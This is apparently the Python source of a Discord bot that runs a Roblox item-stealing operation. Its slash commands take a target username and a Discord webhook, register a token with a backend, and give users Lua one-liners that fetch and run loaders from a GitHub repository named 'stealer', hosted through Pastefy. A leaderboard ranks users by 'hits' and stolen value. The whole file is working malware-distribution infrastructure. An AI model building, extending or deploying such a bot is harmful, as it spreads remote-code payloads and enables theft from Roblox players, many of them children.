from __future__ import annotations

import asyncio
import os
import time

import discord
from discord import app_commands
from discord.ext import commands
import httpx
from dotenv import load_dotenv

load_dotenv()

TOKEN          = os.environ["discord_bot_token"]
PROTECTOR      = os.environ["protector_url"].rstrip("/")
SECRET         = os.environ["admin_secret"]
PASTEFY_KEY    = os.environ.get("pastefy_api_key", "")
STATUS_OWNER   = 1454388467713704046

PASTEFY_BASE   = "https://pastefy.app/api/v2"
ROBLOX_SEARCH  = "https://users.roblox.com/v1/users/search"

ps99_loader  = "https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-ps99"
main_loader  = "https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader"

CACHE_TTL   = 60
name_cache: dict[str, tuple[float, bool]] = {}
paste_lock  = asyncio.Lock()

generated_users: dict[int, str] = {}
generated_names: dict[int, str] = {}

intents = discord.Intents.default()
intents.message_content = True
bot     = commands.Bot(command_prefix=".", intents=intents)
tree    = bot.tree


async def check_name(name: str) -> tuple[bool, str]:
    key = name.lower()
    now = time.time()

    if key in name_cache:
        expires, exists = name_cache[key]
        if now < expires:
            print(f"[DEBUG] name_cache hit | name={name} exists={exists}")
            return (True, "ok") if exists else (False, "invalid user")

    print(f"[DEBUG] roblox lookup | name={name}")
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(ROBLOX_SEARCH, params={"keyword": name, "limit": 10})
    except httpx.RequestError as e:
        print(f"[DEBUG] roblox api error: {e}")
        return True, "ok"

    if resp.status_code != 200:
        print(f"[DEBUG] roblox api status {resp.status_code}")
        return True, "ok"

    data   = resp.json()
    names  = [u.get("name", "").lower() for u in data.get("data", [])]
    exists = name.lower() in names

    name_cache[key] = (now + CACHE_TTL, exists)
    print(f"[DEBUG] roblox lookup result | name={name} found={exists}")
    return (True, "ok") if exists else (False, "invalid user")


async def make_paste(content: str, title: str) -> str | None:
    if not PASTEFY_KEY:
        print("[DEBUG] no pastefy key")
        return None

    async with paste_lock:
        print(f"[DEBUG] creating paste | title={title}")
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.post(
                    f"{PASTEFY_BASE}/paste",
                    json={"title": title, "content": content},
                    headers={
                        "Authorization": f"Bearer {PASTEFY_KEY}",
                        "Content-Type":  "application/json",
                    },
                )
            if resp.status_code in (200, 201):
                data     = resp.json()
                paste_id = data.get("paste", {}).get("id")
                if paste_id:
                    url = f"https://pastefy.app/{paste_id}/raw"
                    print(f"[DEBUG] paste created | url={url}")
                    return url
                print(f"[DEBUG] no paste id in response: {data}")
            else:
                print(f"[DEBUG] pastefy error {resp.status_code}: {resp.text}")
        except Exception as e:
            print(f"[DEBUG] pastefy exception: {e}")
    return None


async def check_webhook(url: str) -> bool:
    if (
        "discord.com/api/webhooks/"    not in url
        and "discordapp.com/api/webhooks/" not in url
    ):
        print(f"[DEBUG] webhook url invalid format: {url}")
        return False
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(url)
        ok = resp.status_code == 200 and "id" in resp.json()
        print(f"[DEBUG] webhook check | ok={ok} status={resp.status_code}")
        return ok
    except Exception as e:
        print(f"[DEBUG] webhook check error: {e}")
    return False


async def register_token_api(
    webhook_url: str,
    username:    str,
    discord_id:  int,
) -> str | None:
    print(f"[DEBUG] registering token | username={username} discord_id={discord_id}")
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(
                f"{PROTECTOR}/api/v3/token/register",
                json={
                    "webhook_url": webhook_url,
                    "username":    username,
                    "discord_id":  discord_id,  # changed to int
                },
                headers={"x-admin-secret": SECRET},
            )
        print(f"[DEBUG] token register response | status={resp.status_code}")
        if resp.status_code == 200:
            tok = resp.json().get("token")
            print(f"[DEBUG] token issued | token={tok[:30]}...")
            return tok
        print(f"[DEBUG] token register failed | body={resp.text[:200]}")
    except Exception as e:
        print(f"[DEBUG] token register exception: {e}")
    return None


async def fetch_leaderboard() -> list[dict]:
    print("[DEBUG] fetching leaderboard from protector")
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(
                f"{PROTECTOR}/api/v3/leaderboard",
                params={"x_admin_secret": SECRET},
            )
        if resp.status_code == 200:
            data = resp.json().get("leaderboard", [])
            print(f"[DEBUG] leaderboard fetched | entries={len(data)}")
            return data
        print(f"[DEBUG] leaderboard fetch failed | status={resp.status_code}")
    except Exception as e:
        print(f"[DEBUG] leaderboard fetch exception: {e}")
    return []


def build_script(username: str, token: str, loader_url: str) -> str:
    return (
        f'user = "{username}"\n'
        f'id = "{token}"\n'
        f'loadstring(game:HttpGet("{loader_url}", true))()'
    )




class MobileCopyView(discord.ui.View):
    def __init__(self, script: str):
        super().__init__(timeout=None)
        self.script = script

    @discord.ui.button(label="mobile copy", style=discord.ButtonStyle.secondary)
    async def mobile_copy(self, interaction: discord.Interaction, button: discord.ui.Button):
        print(f"[DEBUG] mobile copy button clicked | user={interaction.user.id}")
        await interaction.response.send_message(
            f"`{self.script}`",
            ephemeral=True,
        )


@tree.command(name="generate", description="generate script with token")
@app_commands.describe(
    username="target roblox username",
    webhook="discord webhook url",
)
async def generate(interaction: discord.Interaction, username: str, webhook: str):
    print(f"[DEBUG] /generate | caller={interaction.user.id} username={username}")
    await interaction.response.defer(ephemeral=True)

    discord_id = interaction.user.id

    if discord_id in generated_users:
        print(f"[DEBUG] already generated | discord_id={discord_id}")
        await interaction.followup.send("you already have a script", ephemeral=True)
        return

    if not await check_webhook(webhook):
        await interaction.followup.send("invalid webhook", ephemeral=True)
        return

    valid, reason = await check_name(username)
    if not valid:
        await interaction.followup.send(reason, ephemeral=True)
        return

    generated_token = await register_token_api(webhook, username, discord_id)
    if not generated_token:
        await interaction.followup.send("protector error, try again", ephemeral=True)
        return

    generated_users[discord_id] = generated_token
    generated_names[discord_id] = str(interaction.user)
    print(f"[DEBUG] token stored | discord_id={discord_id} total_users={len(generated_users)}")

    raw_script  = build_script(username, generated_token, main_loader)
    paste_link  = await make_paste(raw_script, f"{username}_loader")

    if paste_link:
        pc_script     = f'loadstring(game:HttpGet("{paste_link}", true))()'
        mobile_script = f"loadstring(game:HttpGet('{paste_link}', true))()"
    else:
        pc_script     = raw_script
        mobile_script = raw_script

    embed = discord.Embed(title="your script", color=0x57F287)
    embed.add_field(
        name="pc",
        value=f"```lua\n{pc_script}\n```",
        inline=False,
    )

    view = MobileCopyView(mobile_script)

    try:
        await interaction.user.send(embed=embed, view=view)
        print(f"[DEBUG] DM sent | discord_id={discord_id}")
    except discord.Forbidden:
        print(f"[DEBUG] DM failed (forbidden) | discord_id={discord_id}")
        await interaction.followup.send("could not DM you, check your privacy settings", ephemeral=True)
        return

    await interaction.followup.send("script sent to your DMs", ephemeral=True)


@tree.command(name="ps99", description="generate ps99 script")
@app_commands.describe(
    username="target roblox username",
    webhook="discord webhook url",
    minrap="minimum rap value",
)
async def ps99(interaction: discord.Interaction, username: str, webhook: str, minrap: int):
    print(f"[DEBUG] /ps99 | caller={interaction.user.id} username={username} minrap={minrap}")
    await interaction.response.defer(ephemeral=True)

    discord_id = interaction.user.id

    if discord_id in generated_users:
        print(f"[DEBUG] already generated | discord_id={discord_id}")
        await interaction.followup.send("you already have a script", ephemeral=True)
        return

    if not await check_webhook(webhook):
        await interaction.followup.send("invalid webhook", ephemeral=True)
        return

    valid, reason = await check_name(username)
    if not valid:
        await interaction.followup.send(reason, ephemeral=True)
        return

    generated_token = await register_token_api(webhook, username, discord_id)
    if not generated_token:
        await interaction.followup.send("protector error, try again", ephemeral=True)
        return

    generated_users[discord_id] = generated_token
    generated_names[discord_id] = str(interaction.user)
    print(f"[DEBUG] ps99 token stored | discord_id={discord_id}")

    raw_script = (
        f'user = "{username}"\n'
        f'webhook = "{webhook}"\n'
        f'minrap = {minrap}\n'
        f'loadstring(game:HttpGet("{ps99_loader}", true))()'
    )
    paste_link = await make_paste(raw_script, f"ps99_{username}")

    if paste_link:
        pc_script     = f'loadstring(game:HttpGet("{paste_link}", true))()'
        mobile_script = f"loadstring(game:HttpGet('{paste_link}', true))()"
    else:
        pc_script     = raw_script
        mobile_script = raw_script

    embed = discord.Embed(title="your script", color=0x57F287)
    embed.add_field(
        name="pc",
        value=f"```lua\n{pc_script}\n```",
        inline=False,
    )

    view = MobileCopyView(mobile_script)

    try:
        await interaction.user.send(embed=embed, view=view)
        print(f"[DEBUG] DM sent | discord_id={discord_id}")
    except discord.Forbidden:
        print(f"[DEBUG] DM failed (forbidden) | discord_id={discord_id}")
        await interaction.followup.send("could not DM you, check your privacy settings", ephemeral=True)
        return

    await interaction.followup.send("script sent to your DMs", ephemeral=True)


@tree.command(name="auto-joiner", description="get the auto-joiner script")
@app_commands.describe(
    token="your horizon token",
    user="your roblox username",
)
async def auto_joiner(
    interaction: discord.Interaction,
    token:       str,
    user:        str,
):
    print(f"[DEBUG] /auto-joiner | caller={interaction.user.id} user={user}")
    await interaction.response.defer(ephemeral=True)

    script = (
        f'token = "{token}"\n'
        f'user = "{user}"\n'
        f'loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/auto-joiner/auto-joiner-loader", true))()'
    )

    paste_link = await make_paste(script, f"autojoiner_{user}")

    if paste_link:
        pc_script = f'loadstring(game:HttpGet("{paste_link}", true))()'
        mobile_script = f"loadstring(game:HttpGet('{paste_link}', true))()"
    else:
        pc_script = script
        mobile_script = script

    embed = discord.Embed(
        title="auto-joiner",
        color=0x5865F2,
    )

    if paste_link:
        embed.add_field(
            name="pc",
            value=f"```lua\n{pc_script}\n```",
            inline=False,
        )
        view = MobileCopyView(mobile_script)
    else:
        embed.add_field(
            name="script",
            value=f"```lua\n{script}\n```",
            inline=False,
        )
        view = MobileCopyView(script)

    print(f"[DEBUG] auto-joiner script built | paste={paste_link}")

    try:
        await interaction.user.send(embed=embed, view=view)
        print(f"[DEBUG] auto-joiner DM sent | discord_id={interaction.user.id}")
    except discord.Forbidden:
        await interaction.followup.send("could not DM you, check your privacy settings", ephemeral=True)
        return

    await interaction.followup.send("script sent to your DMs", ephemeral=True)


@tree.command(name="leaderboard", description="show the hit leaderboard")
async def leaderboard(interaction: discord.Interaction):
    print(f"[DEBUG] /leaderboard | caller={interaction.user.id}")
    await interaction.response.defer()

    lb = await fetch_leaderboard()
    if not lb:
        await interaction.followup.send("no data yet", ephemeral=True)
        return

    lines = []
    for i, entry in enumerate(lb[:15], start=1):
        did        = entry.get("discord_id", "unknown")
        hits       = entry.get("total_hits", 0)
        c_val      = entry.get("total_claimed_value", 0.0)
        user_label = f"<@{did}>" if str(did).isdigit() else str(did)
        lines.append(
            f"**{i}.** {user_label}\n"
            f"total hits: `{hits}` , total claimed value: `${c_val:,.2f}`"
        )

    embed = discord.Embed(
        title      = "hit counter",
        description = "\n\n".join(lines) or "no data yet",
        color      = 0x57F287,
    )
    await interaction.followup.send(embed=embed)


@bot.command(name="status")
async def status_cmd(ctx: commands.Context):
    print(f"[DEBUG] .status | caller={ctx.author.id}")

    if ctx.author.id != STATUS_OWNER:
        print(f"[DEBUG] .status denied | caller={ctx.author.id}")
        return

    total_generated = len(generated_users)

    lb        = await fetch_leaderboard()
    real_users = sum(1 for entry in lb if entry.get("total_hits", 0) >= 5)

    print(f"[DEBUG] .status | total_generated={total_generated} real_users={real_users}")

    embed = discord.Embed(title="status", color=0x2B2D31)
    embed.add_field(name="generated", value=str(total_generated), inline=True)
    embed.add_field(name="real users (5+ hits)", value=str(real_users), inline=True)

    if generated_users:
        user_list = "\n".join(
            f"{generated_names.get(uid, str(uid))}" for uid in list(generated_users.keys())[:20]
        )
        embed.add_field(name="users", value=f"```\n{user_list}\n```", inline=False)

    await ctx.send(embed=embed)


@bot.event
async def on_ready():
    print(f"[DEBUG] on_ready | user={bot.user} id={bot.user.id}")
    await tree.sync()
    print("[DEBUG] slash commands synced globally")


@bot.event
async def on_command_error(ctx: commands.Context, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"[DEBUG] command error | {error}")


print("[DEBUG] bot.py loaded, starting...")
bot.run(TOKEN)
